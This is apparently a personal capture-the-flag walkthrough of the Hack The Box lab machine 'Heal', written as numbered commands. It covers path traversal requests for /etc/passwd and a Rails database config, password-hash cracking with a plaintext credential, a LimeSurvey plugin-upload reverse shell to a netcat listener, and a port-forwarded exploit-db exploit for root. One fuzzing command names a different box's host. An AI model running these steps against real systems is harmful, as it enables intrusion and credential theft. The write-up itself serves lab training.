**NOTES:**

VPN 10.10.11.46

1.  Add **heal.htb** to **/etc/hosts** file **RUN:** **sudo nano
    /etc/hosts**

2.  RUN: **Nmap -sV -Pn heal.htb**

Ports found: 22, 80

![](Heal/media/image1.png){width="4.538461286089239in"
height="1.317004593175853in"}

3.  **SUBDOMAIN-FUZZING**

RUN: **ffuf -w
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u
http://monitorsthree.htb -H \"Host:FUZZ.monitorsthree.htb\" -ac**

![](Heal/media/image2.png){width="4.524886264216973in"
height="2.0443667979002624in"}

4.  Add **api.heal.htb** to **/etc/hosts** file

![](Heal/media/image3.png){width="4.511311242344707in"
height="1.529468503937008in"}

5.  Open in Browser: heal.htb

- Register a USER

- After that, check the survey button, hover over TAKE THE SURVEY (There
  is a hidden URL)

![](Heal/media/image4.png){width="3.8626377952755906in"
height="3.6200240594925632in"}

![](Heal/media/image5.png){width="3.890110454943132in"
height="3.954897200349956in"}

6.  [Add to **take-survey.heal.htb** to **/etc/hosts** file]{.mark}

7.  Open the hidden page

- Username **ralph** found

![](Heal/media/image6.png){width="3.3461548556430447in"
height="1.7374759405074365in"}

8.  Check hidden page. RUN: **dirsearch -u
    take-survey.heal.htb/index.php -t 50**

**Result**

![](Heal/media/image7.png){width="6.290972222222222in"
height="0.4673611111111111in"}

**Opened**

![](Heal/media/image8.png){width="4.252748250218723in"
height="3.859695975503062in"}

9.  Go back to heal.htb/resume and login with your previously created
    account

10. Open Burpsuite and intercept the proxy

- Page loaded with INTERCEPT ON

![](Heal/media/image9.png){width="4.15594706911636in"
height="2.5989009186351706in"}

- Result: 1 time forwarded. Send to Repeater

![](Heal/media/image10.png){width="4.164835958005249in"
height="2.5222364391951007in"}

- Added Path traversal

**GET /download?filename=../../../../../etc/passwd HTTP/1.1**

![](Heal/media/image11.png){width="5.598902012248469in"
height="3.541998031496063in"}

- Search for HOME to find Users

![](Heal/media/image12.png){width="3.7472528433945755in"
height="1.1387773403324584in"}

Since we found that the website RUBY ON RAILS (api.heal.htb) used it, we
searched and got it's config file address

- Mod 1^st^ line: **GET /download?filename=../../config/database.yml
  HTTP/1.1**

- **Click Send**

![](Heal/media/image13.png){width="5.434066054243219in"
height="3.554727690288714in"}

Download sqlite3 file

![](Heal/media/image14.png){width="5.214285870516186in"
height="3.2899660979877514in"}

11. Crack PASSWORD HASH

- Create a txt file with the HASH inside

![](Heal/media/image15.png){width="3.3076924759405073in"
height="0.869319772528434in"}

- RUN: **john test.txt \--wordlist=/usr/share/wordlists/rockyou.txt**

![](Heal/media/image16.png){width="6.302083333333333in"
height="1.6041666666666667in"}

- Login via SSH not possible

- Login with found credentials, **USER:** ralph **PASSWORD:** 147258369
  on

[**http://take-survey.heal.htb/index.php/admin/home.php**](http://take-survey.heal.htb/index.php/admin/home.php)

![](Heal/media/image17.png){width="4.637363298337708in"
height="3.063104768153981in"}

Website Verison, see below.

![](Heal/media/image18.png){width="2.0604396325459318in"
height="0.27405074365704285in"}

12. **LimeSurvey-RCE** (Find a script on Github)

<https://github.com/Y1LD1R1M-1337/Limesurvey-RCE>

![](Heal/media/image19.png){width="2.593406605424322in"
height="2.065793963254593in"}

- Download **config.xml** and **php-rev.php** in Kali VM

- Add **version 6.0** to **config.xml INFO: otherwise it won't work**

![](Heal/media/image20.png){width="6.302083333333333in"
height="3.263888888888889in"}

- Check your **Kali machine's IP-ADDRESS** (COMMAND: ifconfig)

![](Heal/media/image21.png){width="3.8461548556430447in"
height="0.27586067366579176in"}

- Put this IP in the **php-rev.php** script

**Result:**

![](Heal/media/image22.png){width="5.1593416447944005in"
height="3.218969816272966in"}

- ZIP both files (config.xml and php-rev.php)

INFO: Open new Terminal in same directory as both files are located!

RUN: **zip zipname config.xml php-rev.php**

![](Heal/media/image23.png){width="5.093406605424322in"
height="1.2268667979002625in"}

13. Upload zipname.zip + activate plugin

![](Heal/media/image24.png){width="6.3in" height="1.4472222222222222in"}

Click 3^rd^ step and select the file **zipname.zip**

![](Heal/media/image25.png){width="6.3in" height="3.6in"}

Push INSTALL

![](Heal/media/image26.png){width="6.3in" height="2.7194444444444446in"}

![](Heal/media/image27.png){width="6.3in" height="3.4458333333333333in"}

Activate it

![](Heal/media/image28.png){width="6.3in" height="0.9506944444444444in"}

Activated

![](Heal/media/image29.png){width="6.3in"
height="0.37777777777777777in"}

14. Start listener on Kali VM

RUN: **nc -lvnp 100**

![](Heal/media/image30.png){width="6.3in" height="1.1729166666666666in"}

15. To bounce shell, open this URL in Browser

**http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php**

**SUCCEEDED**

![](Heal/media/image31.png){width="6.3in" height="1.7513888888888889in"}

16. Change directory to /var/www/limesurvey/application/config

- RUN: cat config.php

**USER + PASSWORD FOUND**

This **PASSWORD** can be used with **USER= ron (SSH login works)**

![](Heal/media/image32.png){width="6.3in" height="4.500694444444444in"}

**INFO:** There is only 1 ralph user in the table, his password is the
same as the hash above = 147258369

**There is nothing that can be used in the database**

17. 1^st^ FLAG: Cat user.txt

![](Heal/media/image33.png){width="4.353596894138232in"
height="3.3131867891513562in"}

**[PRIVILEGE ESCALATION]{.underline}**

1.  Transfer Linpeas.sh with SCP-COMMAND to SERVER and let it run.

2.  Start linpeas with: **./linpeas.sh**

![](Heal/media/image34.png){width="7.0865135608048995in"
height="1.554945319335083in"}

3.  Port forwarding: RUN: **ssh -L 8500:127.0.0.1:8500 <ron@heal.htb>**

> ![](Heal/media/image35.png){width="4.902309711286089in"
> height="3.5549453193350833in"}

4.  Open website **http://127.0.0.1:8500**, check source code

**-Source code 1.19.2 found**

> ![](Heal/media/image36.png){width="3.4890113735783026in"
> height="1.187503280839895in"}

5.  Look for vulnerability <https://www.exploit-db.com/exploits/51117>

> Create exploit.py and put the script in

6.  Set NC listener to get bounce shell

**On Kali machine**:

RUN: **nc -lvnp 100**

> ![](Heal/media/image37.png){width="2.2307688101487315in"
> height="0.8517049431321085in"}

7.  Send request to listener (to Kali VM)

> RUN (on Kali VM): **python exploit.py 127.0.0.1 8500 Kali-IP 100 0**
>
> ![](Heal/media/image38.png){width="3.192308617672791in"
> height="0.9669116360454943in"}

8.  Connection established. Found Root.txt

![](Heal/media/image39.png){width="4.1703291776028in"
height="3.901259842519685in"}
